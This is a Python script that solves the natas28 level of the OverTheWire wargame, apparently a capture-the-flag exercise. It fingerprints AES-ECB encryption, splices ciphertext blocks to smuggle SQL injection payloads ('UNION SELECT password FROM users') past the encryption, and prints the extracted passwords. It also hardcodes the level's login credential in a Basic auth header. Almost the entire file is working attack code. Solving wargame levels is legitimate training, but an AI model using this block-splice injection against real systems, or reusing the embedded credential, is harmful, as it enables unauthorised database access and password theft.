import urllib.request, urllib.parse, base64
# natas28: ECB block-splice injection. The ciphertext is AES-ECB (identical
# plaintext blocks encrypt identically). The plaintext is a 10-byte prefix +
# our query inside quotes. Keep blocks 0..2 from an 8-char query (block 2 ends
# the prefix), start the payload at block 3 via a 10-char shift, and splice.
auth = "Basic " + base64.b64encode(b"natas28:Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3").decode()
class NR(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl): return None
op = urllib.request.build_opener(NR)
def ct_for(q):
    d = urllib.parse.urlencode({"query": q}).encode()
    try:
        r = op.open(urllib.request.Request("http://natas28.natas.labs.overthewire.org/index.php", data=d, headers={"Authorization": auth}), timeout=10)
        loc = r.headers.get("Location")
    except urllib.error.HTTPError as e:
        loc = e.headers.get("Location")
    return base64.b64decode(urllib.parse.unquote(loc.split("query=")[1]))
def get_ct(raw):
    u = "http://natas28.natas.labs.overthewire.org/search.php/?query=" + urllib.parse.quote(base64.b64encode(raw).decode())
    return op.open(urllib.request.Request(u, headers={"Authorization": auth}), timeout=10).read().decode("utf-8", "replace")
print("probe: ciphertext length vs query length (16-byte blocks => ECB):")
for n in range(0, 17):
    raw = ct_for("a" * n)
    print("   a*%-2d -> %3d bytes (%d blocks)" % (n, len(raw), len(raw) // 16))
print("probe: identical plaintext blocks encrypt identically (ECB fingerprint):")
raw = ct_for("A" * 64)
print("   A*64 ->", [raw[i:i+16].hex()[:12] for i in range(0, len(raw), 16)])
base = ct_for("a" * 8)
b = [base[i:i+16] for i in range(0, len(base), 16)]
print("base blocks:", [x.hex()[:12] for x in b])
for payload in [" UNION SELECT 1-- ", " UNION SELECT password FROM users-- "]:
    q2 = "b" * 10 + payload
    r2 = ct_for(q2)
    b2 = [r2[i:i+16] for i in range(0, len(r2), 16)]
    print("payload:", repr(payload))
    print("   payload blocks:", [x.hex()[:12] for x in b2])
    spliced = b[0] + b[1] + b[2] + b"".join(b2[3:])
    body = get_ct(spliced)
    i = body.find("<ul>")
    j = body.find("</ul>", i)
    print("   result:", body[i+4:j].strip()[:200])

